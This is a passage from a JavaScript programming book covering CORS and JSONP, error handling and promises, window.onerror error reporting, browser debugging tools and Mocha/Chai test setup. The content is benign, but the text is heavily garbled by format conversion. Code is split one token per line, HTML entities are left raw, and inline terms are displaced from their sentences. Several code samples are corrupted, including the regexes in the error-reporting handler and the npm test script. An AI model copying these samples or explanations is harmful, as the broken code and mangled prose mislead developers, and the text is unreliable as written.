<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

As far as client-side JavaScript engines are concerned (those running
inside a browser), there is no straightforward solution available for
requesting content from sources other than the current domain. (By the
way, this limitation does not exist in JavaScript-server tools such as
Node JS.)
>
However, it is (in some situations) indeed possible to retrieve data
from other sources using the following methods. Please do note that
some of them may present hacks or workarounds instead of solutions
production system should rely on.
>
**Method 1: CORS**

  
  Access
  

  

Most public APIs today allow developers to send data bidirectionally
between client and server by enabling a feature called CORS
(Cross-Origin Resource Sharing). The browser will check if a certain
HTTP header (-

  
  Control                  &minus;   Allow             &minus;   Origin
  -    

  

) is set and that the requesting site&apos;s domain is listed in the
header&apos;s value. If it is, then the

browser will allow establishing AJAX connections.
>
However, because developers cannot change other servers&apos; response
headers, this method can&apos;t always be relied on.
>
**Method 2: JSONP**
>
**JSON** with **P**adding is commonly blamed to be a workaround. It is
not the most straightforward method, but it still gets the job done.
This method takes advantage of the fact that script files can be
loaded from any domain. Still, it is crucial to mention that
requesting JavaScript code from external sources is **always** a
potential security risk and this should generally be avoided if
there&apos;s a better solution available.
>
The data requested using JSONP is typically JSON, which happens to fit
the syntax used for object definition in JavaScript, making this
method of transport very simple. A common way to let websites use the
external data obtained via JSONP is to wrap it inside a callback
function, which is set via a GET parameter in the URL. Once the
external script file loads, the function will be called with the data
as its first parameter.

**&lt;**

**script**

**&gt;**

function myfunc(obj){

console.log(obj.example_field);

}

**&lt;**

**/script**

**&gt;**

**&lt;**

**script**

src

=

&quot;http://example.com/api/endpoint.js?callback=myfunc&quot;

**&gt;**

**&lt;**

**/script**

**&gt;**

  
  http   :   *//example.com/api/endpoint.js?callback=myfunc*
    

  

The contents of might look like this:

myfunc

(

{

&quot;example_field&quot;

:

**true**

}

)

The function always has to be defined first, otherwise it won&apos;t be
defined when the external script loads.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 97: Error Handling
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 97.1: Error objects
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Runtime errors in JavaScript are instances of the Error object. The
Error object can also be used as-is, or as the base for user-defined
exceptions. It&apos;s possible to throw any type of value - for example,
strings - but you&apos;re strongly encouraged to use Error or one of its
derivatives to ensure that debugging information &bsol; such as stack
traces &bsol; is correctly preserved.
>
The first parameter to the Error constructor is the human-readable
error message. You should try to always specify a useful error message
of what went wrong, even if additional information can be found
elsewhere.

**try**

{

**throw**

**new**

Error

(

&apos;Useful message&apos;

)

;

}

**catch**

(

error

)

{

console.

log

(

&apos;Something went wrong! &apos;

&plus;

error.

message

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 97.2: Interaction with Promises
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Version ≥ 6

Exceptions are to synchronous code what rejections are to
promise-based asynchronous code. If an exception is thrown in a
promise handler, its error will be automatically caught and used to
reject the promise instead.

Promise.

resolve

(

5

)

.

then

(

result

=&gt;

{

**throw**

**new**

Error

(

&quot;I don&apos;t like five&quot;

)

;

}

)

.

then

(

result

=&gt;

{

console.

info

(

&quot;Promise resolved: &quot;

&plus;

result

)

;

}

)

.

**catch**

(

error

=&gt;

{

console.

error

(

&quot;Promise rejected: &quot;

&plus;

error

)

;

}

)

;

Promise rejected

:

Error

:

I don

&apos;t like five

Version &bsol;7

The [async functions
proposal](http://tc39.github.io/ecmascript-asyncawait/)expected to
be part of ECMAScript 2017extends this in the opposite direction.
If you await a rejected promise, its error is raised as an exception:

async

**function**

main

(

)

{

**try**

{

await Promise.

reject

(

**new**

Error

(

&quot;Invalid something&quot;

)

)

;

}

**catch**

(

error

)

{

console.

log

(

&quot;Caught error: &quot;

&plus;

error

)

;

}

}

main

(

)

;

Caught error

:

Invalid something

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 97.3: Error types
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

There are six specific core error constructors in JavaScript:

  
  eval
  

  

**EvalError** - creates an instance representing an error that occurs
regarding the global function ().
>
**InternalError** - creates an instance representing an error that
occurs when an internal error in the
>
JavaScript engine is thrown. E.g. &quot;too much recursion&quot;. (Supported
only by **Mozilla Firefox**)
>
**RangeError** - creates an instance representing an error that occurs
when a numeric variable or parameter is outside of its valid range.
>
**ReferenceError** - creates an instance representing an error that
occurs when dereferencing an invalid reference.

  
  eval
  

  

**SyntaxError** - creates an instance representing a syntax error that
occurs while parsing code in ().
>
**TypeError** - creates an instance representing an error that occurs
when a variable or parameter is not of a valid type.

  
  encodeURI                   () or           decodeURI
    

  

**URIError** - creates an instance representing an error that occurs
when () are passed invalid parameters.
>
If you are implementing error handling mechanism you can check which
kind of error you are catching from code.

**try**

{

**throw**

**new**

TypeError

(

)

;

}

**catch**

(

e

)

{

**if**

(

e

**instanceof**

Error

)

{

console.

log

(

&apos;instance of general Error constructor&apos;

)

;

}

**if**

(

e

**instanceof**

TypeError

)

{

console.

log

(

&apos;type error&apos;

)

;

}

}

In such case e will be an instance of TypeError. All error types
extend the base constructor Error, therefore it&apos;s also an instance of
Error.
>
Keeping that in mind shows us that checking e to be an instance of
Error is useless in most cases.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 97.4: Order of operations plus advanced thoughts
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Without a try catch block, undefined functions will throw errors and
stop execution:
>
undefinedFunction(&quot;This will not get executed&quot;);

console.log(&quot;I will never run because of the uncaught error!&quot;); Will
throw an error and not run the second line:

*// Uncaught ReferenceError: undefinedFunction is not defined*

You need a try catch block, similar to other languages, to ensure you
catch that error so code can continue to execute:

**try**

{

undefinedFunction

(

&quot;This will not get executed&quot;

)

;

}

**catch**

(

error

)

{

console.

log

(

&quot;An error occurred!&quot;

,

error

)

;

}

**finally**

{

console.

log

(

&quot;The code-block has finished&quot;

)

;

}

console.

log

(

&quot;I will run because we caught the error!&quot;

)

;

Now, we&apos;ve caught the error and can be sure that our code is going to
execute

*// An error occurred! ReferenceError: undefinedFunction is not
defined(*

...

*)*

*// The code-block has finished*

*// I will run because we caught the error!*

What if an error occurs in our catch block!?

**try**

{

undefinedFunction

(

&quot;This will not get executed&quot;

)

;

}

**catch**

(

error

)

{

otherUndefinedFunction

(

&quot;Uh oh&hellip; &quot;

)

;

console.

log

(

&quot;An error occurred!&quot;

,

error

)

;

}

**finally**

{

console.

log

(

&quot;The code-block has finished&quot;

)

;

}

console.

log

(

&quot;I won&apos;t run because of the uncaught error in the catch block!&quot;

)

;

We won&apos;t process the rest of our catch block, and execution will halt
except for the finally block.

*// The code-block has finished*

*// Uncaught ReferenceError: otherUndefinedFunction is not defined(*

...

*)*

You could always nest your try catch blocks.. but you shouldn&apos;t
because that will get extremely messy..

**try**

{

undefinedFunction

(

&quot;This will not get executed&quot;

)

;

}

**catch**

(

error

)

{

**try**

{

otherUndefinedFunction

(

&quot;Uh oh&hellip; &quot;

)

;

}

**catch**

(

error2

)

{

console.

log

(

&quot;Too much nesting is bad for my heart and soul&hellip;&quot;

)

;

}

console.

log

(

&quot;An error occurred!&quot;

,

error

)

;

}

**finally**

{

console.

log

(

&quot;The code-block has finished&quot;

)

;

}

console.

log

(

&quot;I will run because we caught the error!&quot;

)

;

Will catch all errors from the previous example and log the following:

*//Too much nesting is bad for my heart and soul&hellip;*

*//An error occurred! ReferenceError: undefinedFunction is not defined(*

...

*)*

*//The code-block has finished*

*//I will run because we caught the error!*

So, how can we catch all errors!? For undefined variables and
functions: you can&apos;t.
>
Also, you shouldn&apos;t wrap every variable and function in a try/catch
block, because these are simple examples that will only ever occur
once until you fix them. However, for objects, functions and other
variables that you know exist, but you don&apos;t know whether their
properties or sub-processes or side-effects will exist, or you expect
some error states in some circumstances, you should abstract your
error handling in some sort of manner. Here is a very basic example
and implementation.
>
Without a protected way to call untrusted or exception throwing
methods:

**function**

foo

(

a

,

b

,

c

)

{

console.

log

(

a

,

b

,

c

)

;

**throw**

**new**

Error

(

&quot;custom error!&quot;

)

;

}

**try**

{

foo

(

1

,

2

,

3

)

;

}

**catch**

(

e

)

{

**try**

{

foo

(

4

,

5

,

6

)

;

}

**catch**

(

e2

)

{

console.

log

(

&quot;We had to nest because there&apos;s currently no other way&hellip;&quot;

)

;

}

console.

log

(

e

)

;

}

*// 1 2 3*

*// 4 5 6*

*// We had to nest because there&apos;s currently no other way&hellip;*

*// Error: custom error!(*

...

*)*

And with protection:

**function**

foo

(

a

,

b

,

c

)

{

console.

log

(

a

,

b

,

c

)

;

**throw**

**new**

Error

(

&quot;custom error!&quot;

)

;

}

**function**

protectedFunction

(

fn

,

&hellip;

args

)

{

**try**

{

fn.

apply

(

**this**

,

args

)

;

}

**catch**

(

e

)

{

console.

log

(

&quot;caught error: &quot;

&plus;

e&period;

name

&plus;

&quot; -&amp;quot;

&plus;

e&period;

message

)

;

}

}

protectedFunction

(

foo

,

1

,

2

,

3

)

;

protectedFunction

(

foo

,

4

,

5

,

6

)

;

*// 1 2 3*

*// caught error: Error -&bsol;custom error!*

*// 4 5 6*

*// caught error: Error -&bsol;custom error!*

We catch errors and still process all the expected code, though with a
somewhat different syntax. Either way will work, but as you build more
advanced applications you will want to start thinking about ways to
abstract your error handling.

# Chapter 98: Global error handling in browsers

**Parameter Details**

Some browsers will call the event handler with just one argument, an
Event object. However,
>
eventOrMessage other browsers, especially the older ones and older
mobile ones will supply a String message as a first argument.
>
If a handler is called with more than 1 argument, the second argument
usually is an URL of a url
>
JavaScript file that is the source of the problem.
>
If a handler is called with more than 1 argument, the third argument
is a line number inside the lineNumber
>
JavaScript source file.
>
If a handler is called with more than 1 argument, the fourth argument
is the column number colNumber inside the JavaScript source file.
>
If a handler is called with more than 1 argument, the fifth argument
is sometimes an Error object error describing the problem.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 98.1: Handling window.onerror to report all errors back to the server-side
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  window.onerror
  

  

The following example listens to event and uses an image beacon
technique to send the information through the GET parameters of an
URL.
>
**var** hasLoggedOnce = **false**;
>
*// Some browsers (at least Firefox) don&apos;t report line and column
numbers*
>
*// when event is handled through window.addEventListener(&apos;error&apos;,
fn). That&apos;s why // a more reliable approach is to set an event
listener via direct assignment.* window.onerror = **function**
(eventOrMessage, url, lineNumber, colNumber, error) { **if**
(hasLoggedOnce &vert;&vert; !eventOrMessage) {
>
*// It does not make sense to report an error if:*
>
*// 1. another one has already been reported &bsol; the page has an
invalid state and may produce way too many errors.*
>
*// 2. the provided information does not make sense (!eventOrMessage
&bsol; the browser didn&apos;t supply information for some reason.)*
**return**; } hasLoggedOnce = **true**; **if** (**typeof**
eventOrMessage !== &apos;string&apos;) { error = eventOrMessage.error; url =
eventOrMessage.filename &vert;&vert; eventOrMessage.fileName; lineNumber =
eventOrMessage.lineno &vert;&vert; eventOrMessage.lineNumber; colNumber =
eventOrMessage.colno &vert;&vert; eventOrMessage.columnNumber; eventOrMessage
= eventOrMessage.message &vert;&vert; eventOrMessage.name &vert;&vert; error.message
&vert;&vert; error.name; } **if** (error && error.stack) { eventOrMessage =
&lbrack;eventOrMessage, &apos;; Stack: &apos;, error.stack, &apos;.&apos;&rbrack;.join(&apos;&apos;); }
**var** jsFile = (/&lbrack;&Hat;*/&rbrack;+&amp;period;js/i*.exec(url &vert;&vert; &apos;&apos;) &vert;&vert;
&lbrack;&rbrack;)&lbrack;0&rbrack; &vert;&vert; &apos;inlineScriptOrDynamicEvalCode&apos;, stack =
&lbrack;eventOrMessage, &apos; Occurred in &apos;, jsFile, &apos;:&apos;, lineNumber &vert;&vert;
&apos;?&apos;, &apos;:&apos;, colNumber &vert;&vert; &apos;?&apos;&rbrack;.join(&apos;&apos;);
>
*// shortening the message a bit so that it is more likely to fit into
browser&apos;s URL length limit*
>
*(which is 2,083 in some browsers)* stack =
stack.replace(/https?&bsol;&bsol;:&bsol;&bsol;/&bsol;&bsol;/&lbrack;&Hat;*/&rbrack;+/gi*, &apos;&apos;);
>
*// calling the server-side handler which should probably register the
error in a database or a log file*

**new**

Image

(

)

.

src

=

&apos;/exampleErrorReporting?stack=&apos;

&plus;

encodeURIComponent

(

stack

)

;

*// window.DEBUG_ENVIRONMENT a configurable property that may be set to
true somewhere else for*

*debugging and testing purposes.*

**if**

(

window.

DEBUG_ENVIRONMENT

)

{

alert

(

&apos;Client-side script failed: &apos;

&plus;

stack

)

;

}

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 99: Debugging
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 99.1: Interactive interpreter variables
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Note that these only work in the developer tools of certain browsers.
>
&dollar;&lowbar; gives you the value of whatever expression was evaluated last.

&quot;foo&quot;

*// &quot;foo&quot;*

&dollar;&lowbar;

*// &quot;foo&quot;*

  -
  **&lt;div** id                           =     &quot;foo&quot;
   - 

  -

&dollar;0 refers to the DOM element currently selected in the Inspector. So
if **&gt;** is highlighted:

&dollar;0

*// &lt;div id=&quot;foo&quot;&gt;*

&dollar;0.

getAttribute

(

&apos;id&apos;

)

*// &quot;foo&quot;*

&dollar;1 refers to the element previously selected, &dollar;2 to the one selected
before that, and so forth for &dollar;3 and &dollar;4.

  
  &dollar;&dollar;         (      selector
    -

  

To get a collection of elements matching a CSS selector, use ). This
is essentially a shortcut for

document.querySelectorAll.

**var** images = &dollar;&dollar;(&apos;img&apos;); *// Returns an array or a nodelist of
all matching elements*

**&dollar;&lowbar; &dollar;()**¹ **&dollar;&dollar;() &dollar;0 &dollar;1 &dollar;2 &dollar;3 &dollar;4**

Opera 15+ 11+ 11+ 11+ 11+ 15+ 15+ 15+

Chrome 22+ ✔ ✔ ✔ ✔ ✔ ✔ ✔

Firefox 39+ ✔ ✔ ✔ × × × ×

IE 11 11 11 11 11 11 11 11

Safari 6.1+ 4+ 4+ 4+ 4+ 4+ 4+ 4+

  -
  document.getElementById            or   document.querySelector
    -

  -

¹ alias to either

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 99.2: Breakpoints
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Breakpoints pause your program once execution reaches a certain point.
You can then step through the program line by line, observing its
execution and inspecting the contents of your variables.
>
There are three ways of creating breakpoints.

  
  debugger
  

  

1.  From code, using the ; statement.

2.  From the browser, using the Developer Tools.

3.  From an Integrated Development Environment (IDE).

**Debugger Statement**

  
  debugger
  

  

You can place a ; statement anywhere in your JavaScript code. Once the
JS interpreter reaches that line, it will stop the script execution,
allowing you to inspect variables and step through your code.
>
**Developer Tools**
>
The second option is to add a breakpoint directly into the code from
the browser&apos;s Developer Tools.
>
**Opening the Developer Tools**
>
**Chrome or Firefox**

1.  Press F12 to open Developer Tools

2.  Switch to the Sources tab (Chrome) or Debugger tab (Firefox)

3.  Press Ctrl + P and type the name of your JavaScript file

  
  Enter
  

  

4.  Press to open it.

**Internet Explorer or Edge**

1.  Press F12 to open Developer Tools

2.  Switch to the Debugger tab.

3.  Use the folder icon near the upper-left corner of the window to open
    a file-selection pane; you can find your JavaScript file there.

**Safari**

1.  Press Command + Option + C to open Developer Tools

2.  Switch to the Resources tab

3.  Open the &quot;Scripts&quot; folder in the left-side panel

4.  Select your JavaScript file.

**Adding a breakpoint from the Developer Tools**
>
Once you have your JavaScript file open in Developer Tools, you can
click a line number to place a breakpoint. The next time your program
runs, it will pause there.
>
**Note about Minified Sources:** If your source is minified, you can
Pretty Print it (convert to readable format). In Chrome, this is done
by clicking on the {} button in the bottom right corner of the source
code viewer.
>
**IDEs**
>
**Visual Studio Code (VSC)**
>
VSC has [built-in
support](https://code.visualstudio.com/docs/editor/debugging) for
debugging JavaScript.

1.  Click the Debug button on the left or Ctrl + Shift + D

  
  launch.json
  

  

2.  If not already done, create a launch configuration file () by
    pressing the gear icon.

3.  Run the code from VSC by pressing the green play button or hit F5 .

**Adding a breakpoint in VSC**
>
Click next to the line number in your JavaScript source file to add a
breakpoint (it will be marked red). To delete the breakpoint, click
the red circle again.
>
**Tip:** You can also utilise the conditional breakpoints in
browser&apos;s dev tools. These help in skipping unnecessary breaks in
execution. Example scenario: you want to examine a variable in a loop
exactly at 5th iteration.

![](./images/image047.jpg){width="4.288194444444445in"
height="0.8736111111111111in"}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 99.3: Using setters and getters to find what changed a property
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Let&apos;s say you have an object like this:

**var**

myObject

=

{

name

:

&apos;Peter&apos;

}

  
  myObject.name
  

  

Later in your code, you try to access and you get **George** instead
of **Peter**. You start wondering who changed it and where exactly it
was changed. There is a way to place a debugger (or something else) on
every set

  -
  myObject.name                        =   &apos;something&apos;
  -  

  -

(every time someone does ):

**var**

myObject

=

{

&lowbar;name

:

&apos;Peter&apos;

,

**set**

name

(

name

)

{

debugger

;

**this**

.&lowbar;name

=

name

}

,

**get**

name

(

)

{

**return**

**this**

.&lowbar;name

}

}

Note that we renamed name to &lowbar;name and we are going to define a
setter and a getter for name.

  
  **set**   is the setter. That is a sweet spot where you can   console.trace
  name      place debugger,                                     
   - 

  

  
  **get** name
  

  

(), or anything else you need for debugging. The setter will set the
value for name in &lowbar;name. The getter (the part) will read the value
from there. Now we have a fully functional object with debugging
functionality.
>
Most of the time, though, the object that gets changed is not under
our control. Fortunately, we can define setters and getters on
**existing** objects to debug them.

*// First, save the name to &lowbar;name, because we are going to use name for
setter/getter*

otherObject.&lowbar;name

=

otherObject.

name

;

*// Create setter and getter*

Object

.

defineProperty

(

otherObject

,

&quot;name&quot;

,

{

**set**

:

**function**

(

name

)

{

debugger

;

**this**

.&lowbar;name

=

name

}

,

**get**

:

**function**

(

)

{

**return**

**this**

.&lowbar;name

}

}

)

;

Check out
[setters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/set)
and
[getters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/get)
at MDN for more information.
>
Browser support for setters/getters:
>
**Chrome Firefox IE Opera Safari Mobile**

Version 1 2.0 9 9.5 3 all

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 99.4: Using the console
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

In many environments, you have access to a global console object that
contains some basic methods for communicating with standard output
devices. Most commonly, this will be the browser&apos;s JavaScript console
(see
[Chrome](https://developers.google.com/web/tools/chrome-devtools/debug/console/?utm_source=dcc),
[Firefox](https://developer.mozilla.org/en-US/docs/Tools/Browser_Console),
[Safari](https://developer.apple.com/safari/tools/), and
[Edge](https://developer.microsoft.com/en-us/microsoft-edge/platform/documentation/f12-devtools-guide/console/)
for more information).

*// At its simplest, you can &apos;log&apos; a string*

console.

log

(

&quot;Hello, World!&quot;

)

;

*// You can also log any number of comma-separated values*

console.

log

(

&quot;Hello&quot;

,

&quot;World!&quot;

)

;

*// You can also use string substitution*

console.

log

(

&quot;%s %s&quot;

,

&quot;Hello&quot;

,

&quot;World!&quot;

)

;

*// You can also log any variable that exist in the same scope*

**var**

arr

=

&lbrack;

1

,

2

,

3

&rbrack;

;

console.

log

(

arr.

length

,

**this**

)

;

You can use different console methods to highlight your output in
different ways. Other methods are also useful for more advanced
debugging.
>
For more documentation, information on compatibility, and instructions
on how to open your browser&apos;s console, see the Console topic.

  
  console.log
  

  

Note: if you need to support IE9, either remove or wrap its calls as
follows, because console is undefined until the Developer Tools are
opened:

**if**

(

console

)

{

*//IE9 workaround*

console.

log

(

&quot;test&quot;

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 99.5: Automatically pausing execution
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
In Google Chrome, you can pause execution without needing to place
breakpoints.
>
![](./images/image048.jpg){width="0.225in" height="0.225in"}
**Pause on Exception:** While this button is toggled on, if your
program hits an unhandled exception, the program will pause as if it
had hit a breakpoint. The button can be found near Execution Controls
and is useful for locating errors.
>
You can also pause execution when an HTML tag (DOM node) is modified,
or when its attributes are changed. To do that, right click the DOM
node on the Elements tab and select &quot;Break on&hellip;&quot;.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 99.6: Elements inspector
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Clicking the
![](./images/image049.jpg){width="0.21597222222222223in"
height="0.21597222222222223in"} *Select an element in the page to
inspect it* button in the upper left corner of the Elements tab in
Chrome or Inspector tab in Firefox, available from Developer Tools,
and then clicking on an element of the page highlights the element and
assigns it to the &dollar;0 variable.
>
Elements inspector can be used in variety of ways, for example:

1.  You can check if your JS is manipulating DOM the way you expect it
    to,

2.  You can more easily debug your CSS, when seeing which rules affect
    the element (*Styles* tab in Chrome)

3.  You can play around with CSS and HTML without reloading the page.

Also, Chrome remembers last 5 selections in the Elements tab. &dollar;0 is
the current selection, while &dollar;1 is the previous selection. You can go
up to &dollar;4. That way you can easily debug multiple nodes without
constantly switching selection to them.

You can read more at [Google
Developers](https://developers.google.com/web/tools/chrome-devtools/debug/command-line/command-line-reference#section-1).

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 99.7: Break when a function is called
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

For named (non-anonymous) functions, you can break when the function
is executed.

debug

(

functionName

)

;

The next time functionName function runs, the debugger will stop on
its first line.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 99.8: Stepping through code
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Once you&apos;ve paused execution on a breakpoint, you may want to follow
execution line-by-line to observe what happens. Open your browser&apos;s
Developer Tools and look for the Execution Control icons. (This
example uses the icons in Google Chrome, but they&apos;ll be similar in
other browsers.)
>
![](./images/image050.jpg){width="0.21597222222222223in"
height="0.19791666666666666in"} **Resume:** Unpause execution.
Shorcut: F8 (Chrome, Firefox)

  
  F6
  

  

![](./images/image051.jpg){width="0.2611111111111111in"
height="0.18888888888888888in"} **Step Over:** Run the next line of
code. If that line contains a function call, run the whole function
and move to the next line, rather than jumping to wherever the
function is defined. Shortcut : F10 (Chrome, Firefox, IE/Edge),
(Safari)
>
![](./images/image052.jpg){width="0.19791666666666666in"
height="0.20694444444444443in"} **Step Into:** Run the next line of
code. If that line contains a function call, jump into the function
and pause there. Shortcut : F11 (Chrome, Firefox, IE/Edge), F7
(Safari)
>
![](./images/image053.jpg){width="0.19791666666666666in"
height="0.20694444444444443in"} **Step Out:** Run the rest of the
current function, jump back to where the function was called from, and
pause at the next statement there. Shortcut : Shift + F11 (Chrome,
Firefox, IE/Edge), F8 (Safari)
>
Use these in conjunction with the **Call Stack**, which will tell you
which function you&apos;re currently inside of, which function called that
function, and so forth.
>
See Google&apos;s guide on [&quot;How to Step Through the
Code&quot;](https://developers.google.com/web/tools/chrome-devtools/debug/breakpoints/step-code?hl=en)
for more details and advice.
>
Links to browser shortcut key documentation:
>
[Chrome](https://developers.google.com/web/tools/chrome-devtools/iterate/inspect-styles/shortcuts?hl=en#keyboard-shortcuts-by-panel)
>
[Firefox](https://developer.mozilla.org/en-US/docs/Tools/Debugger/Keyboard_shortcuts)
>
[IE](https://msdn.microsoft.com/en-us/library/dd565630(v=vs.85).aspx#debugMode)
>
[Edge](https://developer.microsoft.com/en-us/microsoft-edge/platform/documentation/f12-devtools-guide/developer-tools-keyboard-shortcuts/)
>
[Safari](https://developer.apple.com/library/mac/documentation/AppleApplications/Conceptual/Safari_Developer_Guide/KeyboardShortcuts/KeyboardShortcuts.html)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 100: Unit Testing JavaScript
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and Proxyquire
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Here we have a simple class to be tested that returns a Promise based
on the results of an external ResponseProcessor that takes time to
execute.
>
For simplicity we&apos;ll assume that the processResponse method won&apos;t
ever fail.

import

{

processResponse

}

from

&apos;../utils/response_processor&apos;

;

**const**

ping

=

(

)

=&gt;

{

**return**

**new**

Promise

(

(

resolve

,

&lowbar;reject

)

=&gt;

{

**const**

response

=

processResponse

(

data

)

;

resolve

(

response

)

;

}

)

;

}

module.

exports

=

ping

;

To test this we can leverage the following tools.

1.  [mocha](https://mochajs.org/)

2.  [chai](http://chaijs.com/)

3.  [sinon](http://sinonjs.org/)

4.  [proxyquire](https://github.com/thlorenz/proxyquire)

  
  [chai](https://github.com/domenic/chai-as-promised)   [-](https://github.com/domenic/chai-as-promised)   [as](https://github.com/domenic/chai-as-promised)   [-](https://github.com/domenic/chai-as-promised)   [promised](https://github.com/domenic/chai-as-promised)
  -  -  -

  

5&period;

  
  package.json
  

  

I use the following test script in my file.
>
&quot;test&quot;: &quot;NODE_ENV=test mocha &bsol;compilers js:babel-core/register
&bsol;require
>
./test/unit/test_helper.js &bsol;recursive test/&ast;&ast;/&ast;&lowbar;spec.js&quot;
>
This allows me to use es6 syntax. It references a test_helper that
will look like

import

chai from

&apos;chai&apos;

;

import

sinon from

&apos;sinon&apos;

;

import

sinonChai from

&apos;sinon-chai&apos;

;

import

chaiAsPromised from

&apos;chai-as-promised&apos;

;

import

sinonStubPromise from

&apos;sinon-stub-promise&apos;

;

chai.

use

(

sinonChai

)

;

chai.

use

(

chaiAsPromised

)

;

sinonStubPromise

(

sinon

)

;

  -
